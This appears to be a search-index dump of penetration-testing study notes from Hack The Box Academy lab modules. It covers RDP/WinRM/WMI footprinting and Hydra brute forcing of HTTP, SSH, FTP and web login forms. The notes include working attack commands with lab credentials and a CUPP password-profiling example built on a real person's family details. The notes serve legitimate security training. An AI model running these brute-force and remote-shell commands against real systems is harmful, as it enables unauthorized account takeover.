[10.129.201.248:3389] NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | 00000000: 03 00 00 2a 25 e0 00 00 00 00 00 43 6f 6f 6b 69 *% Cooki 00000010: 65 3a 20 6d 73 74 73 68 61 73 68 3d 6e 6d 61 70 e: mstshash=nmap 00000020: 0d 0a 01 00 08 00 0b 00 00 00 ...SNIP... NSOCK INFO [6.6820s] nsock_write(): Write request for 57 bytes to IOD #2 EID 67 [10.129.201.248:3389] NSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.129.201.248:3389] NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | SEND NSOCK INFO [6.6820s] nsock_read(): Read request from IOD #2 [10.129.201.248:3389] (timeout: 5000ms) EID 74 NSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 74 [10.129.201.248:3389] (211 bytes) NSE: TCP 10.10.14.20:36630 < 10.129.201.248:3389 | 00000000: 30 81 d0 a0 03 02 01 06 a1 81 c8 30 81 c5 30 81 0 0 0 00000010: c2 a0 81 bf 04 81 bc 4e 54 4c 4d 53 53 50 00 02 NTLMSSP 00000020: 00 00 00 14 00 14 00 38 00 00 00 35 82 8a e2 b9 8 5 00000030: 73 b0 b3 91 9f 1b 0d 00 00 00 00 00 00 00 00 70 s p 00000040: 00 70 00 4c 00 00 00 0a 00 63 45 00 00 00 0f 49 p L cE I 00000050: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30 L F - S Q L - 0 00000060: 00 31 00 02 00 14 00 49 00 4c 00 46 00 2d 00 53 1 I L F - S 00000070: 00 51 00 4c 00 2d 00 30 00 31 00 01 00 14 00 49 Q L - 0 1 I 00000080: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30 L F - S Q L - 0 00000090: 00 31 00 04 00 14 00 49 00 4c 00 46 00 2d 00 53 1 I L F - S 000000a0: 00 51 00 4c 00 2d 00 30 00 31 00 03 00 14 00 49 Q L - 0 1 I 000000b0: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30 L F - S Q L - 0 000000c0: 00 31 00 07 00 08 00 1d b3 e8 f2 19 d3 d7 01 00 1 000000d0: 00 00 00 ...SNIP... A Perl script named rdp-sec-check.pl has also been developed by Cisco CX Security Labs that can unauthentically identify the security settings of RDP servers based on the handshakes. RDP Security Check - Installation hrmns@htb[/htb]$ sudo cpan Loading internal logger. Log::Log4perl recommended for better logging CPAN.pm requires configuration, but most of it can be done automatically. If you answer 'no' below, you will enter an interactive dialog for each configuration option instead. Would you like to configure as much as possible automatically? [yes] yes Autoconfiguration complete. commit: wrote '/root/.cpan/CPAN/MyConfig.pm' You can re-run configuration any time with 'o conf init' in the CPAN shell cpan shell -- CPAN exploration and modules installation (v2.27) Enter 'h' for help. cpan[1]> install Encoding::BER Fetching with LWP: http://www.cpan.org/authors/01mailrc.txt.gz Reading '/root/.cpan/sources/authors/01mailrc.txt.gz' ............................................................................DONE ...SNIP... RDP Security Check hrmns@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check hrmns@htb[/htb]$ ./rdp-sec-check.pl 10 .129.201.248 Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov 7 16:50:32 2021 [+] Scanning 1 hosts Target: 10.129.201.248 IP: 10.129.201.248 Port: 3389 [+] Checking supported protocols [-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER [-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER [-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported [+] Checking RDP Security Layer [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported [-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported [+] Summary of protocol support [-] 10.129.201.248:3389 supports PROTOCOL_SSL : FALSE [-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE [-] 10.129.201.248:3389 supports PROTOCOL_RDP : FALSE [+] Summary of RDP encryption support [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT : FALSE [-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS : FALSE [+] Summary of security issues rdp-sec-check v0.9-beta completed at Sun Nov 7 16:50:33 2021","title":"Footprinting the Service"},{"location":"footprinting/windows_remote_management_protocol/#winrm","text":"The Windows Remote Management ( WinRM ) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol ( SOAP ) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on TCP ports 5985 and 5986 for communication, with the last port 5986 using HTTPS , as ports 80 and 443 were previously used for this task.","title":"WinRM"},{"location":"footprinting/windows_remote_management_protocol/#footprinting-the-service_1","text":"We will see that only HTTP ( TCP 5985 ) is used instead of HTTPS ( TCP 5986 ). rmns@htb[/htb]$ nmap -sV -sC 10 .129.201.248 -p5985,5986 --disable-arp-ping -n Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET Nmap scan report for 10.129.201.248 Host is up (0.030s latency). PORT STATE SERVICE VERSION 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. We can use the tool called evil-winrm hrmns@htb[/htb]$ evil-winrm -i 10 .129.201.248 -u Cry0l1t3 -p P455w0rD! Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Cry0l1t3\\Documents>","title":"Footprinting the Service"},{"location":"footprinting/windows_remote_management_protocol/#wmi","text":"Windows Management Instrumentation ( WMI ) is Microsoft's implementation and also an extension of the Common Information Model ( CIM ), core functionality of the standardized Web-Based Enterprise Management ( WBEM ) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console ( WMIC ). WMI is not a single program but consists of several programs and various databases, also known as repositories.","title":"WMI"},{"location":"footprinting/windows_remote_management_protocol/#footprinting-the-service_2","text":"The initialization of the WMI communication always takes place on TCP port 135 , and after the successful establishment of the connection, the communication is moved to a random port. For example, the program wmiexec.py from the Impacket toolkit can be used for this. hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3: \"P455w0rD!\" @10.129.201.248 \"hostname\" Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] SMBv3.0 dialect used ILF-SQL-01","title":"Footprinting the Service"},{"location":"login_brute_forcing/basic_http_auth_brute_forcing/","text":"Default Passwords \u00b6 As we don't know which user to brute force, we will have to brute force both fields. We can either provide different wordlists for the usernames and passwords and iterate over all possible username and password combinations. However, we should keep this as a last resort. It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. test:test -, and scan all of them first. This should not take a long time, and if we could not find any working pairs, we would move to use separate wordlists for each or search for the top 100 most common passwords that can be used. We can find a list of default password login pairs in the SecLists repository as well, specifically in /opt/useful/SecLists/Passwords/Default-Credentials directory . In this case, we will pick ftp-betterdefaultpasslist.txt as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. Options Description -C ftp-betterdefaultpasslist.txt Combined Credentials Wordlist SERVER_IP Target IP -s PORT Target Port http-get Request Method / Target Path hrmns@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178 .211.23.155 -s 31099 http-get / Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task [DATA] attacking http-get://178.211.23.155:31099/ [31099][http-get] host: 178.211.23.155 login: test password: testingpw [STATUS] attack finished for 178.211.23.155 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Username Brute Force \u00b6 Hydra requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service: Credentials Target Host Target Path Credentials can also be separated by usernames and passwords . We can use the -L flag for the usernames wordlist and the -P flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell hydra to stop after the first successful login by specifying the flag -f . Add the \"-u\" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next. hrmns@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178 .35.49.134 -s 32901 http-get / [DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task [DATA] attacking http-get://178.35.49.134:32901/ [STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active <...SNIP...> [32901][http-get] host: 178.35.49.134 login: thomas password: thomas1 [STATUS] attack finished for SERVER_IP (valid pair found) 1 of 1 target successfully completed, 1 valid password found Username Brute Force If we were to only brute force the username or password, we could assign a static username or password with the same flag but lowercase. For example, we can brute force passwords for the test user by adding -l test , and then adding a password word list with -P rockyou.txt . hrmns@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178 .35.49.134 -s 32901 http-get / Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task [DATA] attacking http-get://178.35.49.134:32901/ [32901][http-get] host: 178.35.49.134 login: abbas password: amormio 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra)","title":"Basic HTTP Auth Brute Forcing"},{"location":"login_brute_forcing/basic_http_auth_brute_forcing/#default-passwords","text":"As we don't know which user to brute force, we will have to brute force both fields. We can either provide different wordlists for the usernames and passwords and iterate over all possible username and password combinations. However, we should keep this as a last resort. It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. test:test -, and scan all of them first. This should not take a long time, and if we could not find any working pairs, we would move to use separate wordlists for each or search for the top 100 most common passwords that can be used. We can find a list of default password login pairs in the SecLists repository as well, specifically in /opt/useful/SecLists/Passwords/Default-Credentials directory . In this case, we will pick ftp-betterdefaultpasslist.txt as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. Options Description -C ftp-betterdefaultpasslist.txt Combined Credentials Wordlist SERVER_IP Target IP -s PORT Target Port http-get Request Method / Target Path hrmns@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178 .211.23.155 -s 31099 http-get / Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task [DATA] attacking http-get://178.211.23.155:31099/ [31099][http-get] host: 178.211.23.155 login: test password: testingpw [STATUS] attack finished for 178.211.23.155 (valid pair found) 1 of 1 target successfully completed, 1 valid password found","title":"Default Passwords"},{"location":"login_brute_forcing/basic_http_auth_brute_forcing/#username-brute-force","text":"Hydra requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service: Credentials Target Host Target Path Credentials can also be separated by usernames and passwords . We can use the -L flag for the usernames wordlist and the -P flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell hydra to stop after the first successful login by specifying the flag -f . Add the \"-u\" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next. hrmns@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178 .35.49.134 -s 32901 http-get / [DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task [DATA] attacking http-get://178.35.49.134:32901/ [STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active <...SNIP...> [32901][http-get] host: 178.35.49.134 login: thomas password: thomas1 [STATUS] attack finished for SERVER_IP (valid pair found) 1 of 1 target successfully completed, 1 valid password found Username Brute Force If we were to only brute force the username or password, we could assign a static username or password with the same flag but lowercase. For example, we can brute force passwords for the test user by adding -l test , and then adding a password word list with -P rockyou.txt . hrmns@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178 .35.49.134 -s 32901 http-get / Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task [DATA] attacking http-get://178.35.49.134:32901/ [32901][http-get] host: 178.35.49.134 login: abbas password: amormio 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra)","title":"Username Brute Force"},{"location":"login_brute_forcing/service_authentication/","text":"Personalized Wordlists \u00b6 Cupp \u00b6 Many tools can create a custom password wordlist based on certain information. Cupp is very easy to use. We run it in interactive mode by specifying the -i argument, and answer the questions, as follows: hrmns@htb[/htb]$ cupp -i ___________ cupp.py! # Common \\ # User \\ ,__, # Passwords \\ (oo)____ # Profiler (__) )\\ ||--|| * [ Muris Kurgas | j0rgan@remote-exploit.org ] [ Mebus | https://github.com/Mebus/] [+] Insert the information about the victim to make a dictionary [+] If you don't know all the info, just hit enter when asked! ;) > First Name: William > Surname: Gates > Nickname: Bill > Birthdate (DDMMYYYY): 28101955 > Partners) name: Melinda > Partners) nickname: Ann > Partners) birthdate (DDMMYYYY): 15081964 > Child's name: Jennifer > Child's nickname: Jenn > Child's birthdate (DDMMYYYY): 26041996 > Pet's name: Nila > Company name: Microsoft > Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory > Do you want to add special chars at the end of words? Y/[N]: y > Do you want to add some random numbers at the end of words? Y/[N]:y > Leet mode? (i.e. leet = 1337) Y/[N]: y [+] Now making a dictionary... [+] Sorting list and removing duplicates... [+] Saving dictionary to william.txt, counting 43368 words. [+] Now load your pistolero with william.txt and shoot! Good luck! We get our personalized password wordlist saved as william.txt . The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions: 8 characters or longer contains special characters contains numbers So, we can remove any passwords that do not meet these conditions from our wordlist. Some tools would convert password policies to Hashcat or John rules, but hydra does not support rules for filtering passwords. So, we will simply use the following commands to do that for us: sed -ri '/^.{,7}$/d' william.txt # remove shorter than 8 sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt # remove no special chars sed -ri '/[0-9]+/!d' william.txt # remove no numbers We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter. Mangling \u00b6 It is still possible to create many permutations of each word in that list. We never know how our target thinks when creating their password, and so our safest option is to add as many alterations and permutations as possible, noting that this will, of course, take much more time to brute force. Many great tools do word mangling and case permutation quickly and easily, like rsmangler or The Mentalist . These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind. The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered. Custom Username Wordlist \u00b6 We should also consider creating a personalized username wordlist based on the person's available details. For example, the person's username could be b.gates or gates or bill , and many other potential variations. GitHub Repo hrmns@htb[/htb]$ git clone https://github.com/21y4d/usernameGenerator.git Cloning into 'usernameGenerator'... remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Unpacking objects: 100% (3/3), 868 bytes | 868.00 KiB/s, done. hrmns@htb[/htb]$ bash usernameGenerator/usernameGenerator.sh Usage: usernameGenerator/usernameGenerator.sh <First Name> <Last Name> Run it as per the usage instructions shown above to generate our usernames wordlist: hrmns@htb[/htb]$ bash usernameGenerator/usernameGenerator.sh Bill Gates Wordlist saved as bill.txt Service Authentication Brute Forcing \u00b6 SSH Attack We simply have to provide the username/password wordlists, and add service://SERVER_IP:PORT at the end. As usual, we will add the -u -f flags. Finally, when we run the command for the first time, hydra will suggest that we add the -t 4 flag for a max number of parallel attempts, as many SSH limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped. Our final command should be as follows: hrmns@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task [DATA] attacking ssh://178.35.49.134:22/ [STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active [PORT][ssh] host: 178.35.49.134 login: b.gates password: ...SNIP... [STATUS] attack finished for 178.35.49.134 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) We see that it takes some time to finish, but eventually, we get a working pair, and we identify the user b.gates . Now, we can attempt ssh-ing in using the credentials we got: hrmns@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22 b.gates@SERVER_IP's password: ******** b.gates@bruteforcing:~$ whoami b.gates FTP Brute Forcing \u00b6 Once we are in, we can check out what other users are on the system: b.gates@bruteforcing:~$ ls /home b.gates m.gates We notice another user, m.gates . We also notice in our local recon that port 21 is open locally, indicating that an FTP must be available: b.gates@bruteforcing:~$ netstat -antp | grep -i list (No info could be read for \"-p\": geteuid() =1000 but you should be root.) tcp 0 0 127.0.0.1:21 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - We can try brute forcing the FTP login for the m.gates user now. b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task [DATA] attacking ftp://127.0.0.1:21/ [21][ftp] host: 127.0.0.1 login: m.gates password: <...SNIP...> 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra)","title":"Service Authentication Attacks"},{"location":"login_brute_forcing/service_authentication/#personalized-wordlists","text":"","title":"Personalized Wordlists"},{"location":"login_brute_forcing/service_authentication/#cupp","text":"Many tools can create a custom password wordlist based on certain information. Cupp is very easy to use. We run it in interactive mode by specifying the -i argument, and answer the questions, as follows: hrmns@htb[/htb]$ cupp -i ___________ cupp.py! # Common \\ # User \\ ,__, # Passwords \\ (oo)____ # Profiler (__) )\\ ||--|| * [ Muris Kurgas | j0rgan@remote-exploit.org ] [ Mebus | https://github.com/Mebus/] [+] Insert the information about the victim to make a dictionary [+] If you don't know all the info, just hit enter when asked! ;) > First Name: William > Surname: Gates > Nickname: Bill > Birthdate (DDMMYYYY): 28101955 > Partners) name: Melinda > Partners) nickname: Ann > Partners) birthdate (DDMMYYYY): 15081964 > Child's name: Jennifer > Child's nickname: Jenn > Child's birthdate (DDMMYYYY): 26041996 > Pet's name: Nila > Company name: Microsoft > Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory > Do you want to add special chars at the end of words? Y/[N]: y > Do you want to add some random numbers at the end of words? Y/[N]:y > Leet mode? (i.e. leet = 1337) Y/[N]: y [+] Now making a dictionary... [+] Sorting list and removing duplicates... [+] Saving dictionary to william.txt, counting 43368 words. [+] Now load your pistolero with william.txt and shoot! Good luck! We get our personalized password wordlist saved as william.txt . The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions: 8 characters or longer contains special characters contains numbers So, we can remove any passwords that do not meet these conditions from our wordlist. Some tools would convert password policies to Hashcat or John rules, but hydra does not support rules for filtering passwords. So, we will simply use the following commands to do that for us: sed -ri '/^.{,7}$/d' william.txt # remove shorter than 8 sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt # remove no special chars sed -ri '/[0-9]+/!d' william.txt # remove no numbers We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.","title":"Cupp"},{"location":"login_brute_forcing/service_authentication/#mangling","text":"It is still possible to create many permutations of each word in that list. We never know how our target thinks when creating their password, and so our safest option is to add as many alterations and permutations as possible, noting that this will, of course, take much more time to brute force. Many great tools do word mangling and case permutation quickly and easily, like rsmangler or The Mentalist . These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind. The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered.","title":"Mangling"},{"location":"login_brute_forcing/service_authentication/#custom-username-wordlist","text":"We should also consider creating a personalized username wordlist based on the person's available details. For example, the person's username could be b.gates or gates or bill , and many other potential variations. GitHub Repo hrmns@htb[/htb]$ git clone https://github.com/21y4d/usernameGenerator.git Cloning into 'usernameGenerator'... remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Unpacking objects: 100% (3/3), 868 bytes | 868.00 KiB/s, done. hrmns@htb[/htb]$ bash usernameGenerator/usernameGenerator.sh Usage: usernameGenerator/usernameGenerator.sh <First Name> <Last Name> Run it as per the usage instructions shown above to generate our usernames wordlist: hrmns@htb[/htb]$ bash usernameGenerator/usernameGenerator.sh Bill Gates Wordlist saved as bill.txt","title":"Custom Username Wordlist"},{"location":"login_brute_forcing/service_authentication/#service-authentication-brute-forcing","text":"SSH Attack We simply have to provide the username/password wordlists, and add service://SERVER_IP:PORT at the end. As usual, we will add the -u -f flags. Finally, when we run the command for the first time, hydra will suggest that we add the -t 4 flag for a max number of parallel attempts, as many SSH limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped. Our final command should be as follows: hrmns@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task [DATA] attacking ssh://178.35.49.134:22/ [STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active [PORT][ssh] host: 178.35.49.134 login: b.gates password: ...SNIP... [STATUS] attack finished for 178.35.49.134 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) We see that it takes some time to finish, but eventually, we get a working pair, and we identify the user b.gates . Now, we can attempt ssh-ing in using the credentials we got: hrmns@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22 b.gates@SERVER_IP's password: ******** b.gates@bruteforcing:~$ whoami b.gates","title":"Service Authentication Brute Forcing"},{"location":"login_brute_forcing/service_authentication/#ftp-brute-forcing","text":"Once we are in, we can check out what other users are on the system: b.gates@bruteforcing:~$ ls /home b.gates m.gates We notice another user, m.gates . We also notice in our local recon that port 21 is open locally, indicating that an FTP must be available: b.gates@bruteforcing:~$ netstat -antp | grep -i list (No info could be read for \"-p\": geteuid() =1000 but you should be root.) tcp 0 0 127.0.0.1:21 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - We can try brute forcing the FTP login for the m.gates user now. b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task [DATA] attacking ftp://127.0.0.1:21/ [21][ftp] host: 127.0.0.1 login: m.gates password: <...SNIP...> 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra)","title":"FTP Brute Forcing"},{"location":"login_brute_forcing/web_forms_brute_forcing/","text":"Brute Forcing Forms \u00b6 Hydra provides many different types of requests we can use to brute force different services. If we use hydra -h, we should be able to list supported services: hrmns@htb[/htb]$ hydra -h | grep \"Supported services\" | tr \":\" \"\\n\" | tr \" \" \"\\n\" | column -e Supported ldap3[-{cram|digest}md5][s] rsh services memcached rtsp mongodb s7-300 adam6500 mssql sip asterisk mysql smb cisco nntp smtp[s] cisco-enable oracle-listener smtp-enum cvs oracle-sid snmp firebird pcanywhere socks5 ftp[s] pcnfs ssh http[s]-{head|get|post} pop3[s] sshkey http[s]-{get|post}-form postgres svn http-proxy radmin2 teamspeak http-proxy-urlenum rdp telnet[s] icq redis vmauthd imap[s] rexec vnc irc rlogin xmpp ldap2[s] rpcap Login.php When we try to log in with any credentials and don't see any of our input in the URL, and the URL does not change, we know that the web application uses a POST form. f our target URL shows http, in this case, we should use the http-post-form module. To find out how to use the http-post-form module , we can use the \" -U \" flag to list the parameters it requires and examples of usage: hrmns@htb[/htb]$ hydra http-post-form -U <...SNIP...> Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>] First is the page on the server to GET or POST to (URL). Second is the POST/GET variables ...SNIP... usernames and passwords being replaced in the \"^USER^\" and \"^PASS^\" placeholders The third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by \"F=\", successful condition login check must be preceded by \"S=\". <...SNIP...> Examples: \"/login.php:user=^USER^&pass=^PASS^:incorrect\" In summary, we need to provide three parameters, separated by :, as follows: URL path, which holds the login form POST parameters for username/password A failed/success login string, which lets hydra recognize whether the login attempt was successful or not For the first parameter, we know the URL path is: /login.php The second parameter is the POST parameters for username/passwords: /login.php:[user parameter]=^USER^&[password parameter]=^PASS^ The third parameter is a failed/successful login attempt string. We cannot log in, so we do not know how the page would look like after a successful login, so we cannot specify a success string to look for. /login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string] Fail/Success String \u00b6 To make it possible for hydra to distinguish between successfully submitted credentials and failed attempts, we have to specify a unique string from the source code of the page we're using to log in. Hydra will examine the HTML code of the response page it gets after each attempt, looking for the string we provided. If we provide a fail string, it will keep looking until the string is not found in the response. Another way is if we provide a success string, it will keep looking until the string is found in the response. We can click [Ctrl + U] in Firefox to show the HTML page source, and search for login : < form name = 'login' autocomplete = 'off' class = 'form' action = '' method = 'post' > We will use <form name='login' , which should be distinct enough and will probably not exist after a successful login. So, our syntax for the http-post-form should be as follows: \"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'\" Determine Login Parameters \u00b6 Using Burp Go to Firefox and enable the Burp Proxy . Attempt a login with any username/password 'e.g. admin:admin', and go back to BurpSuite, to find the login request captured: username=admin&password=admin To use in a hydra http-post-form , we can take it as is, and replace the username/password we used admin:admin with USER and PASS . The specification of our final target path should be as follows: \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\" Login Form Attacks \u00b6 Default Credentials Let's try to use the ftp-betterdefaultpasslist.txt list with the default credentials to test if one of the accounts is registered in the web application. hrmns@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178 .35.49.134 -s 32901 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\" Hydra v9.1 (c) d020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task [DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login' 1 of 1 target completed, 0 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) We were not able to identify any working credentials. Still, this only took a few seconds, and we ruled out the use of default passwords. Now, we can move on to use a password wordlist. Password Wordlist \u00b6 Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as admin, administrator, wpadmin, root, adm, and similar are used in administration panels and are rarely changed. Knowing this fact allows us to limit the number of possible usernames. The most common username administrators use is admin . In this case, we specify this username for our next attempt to get access 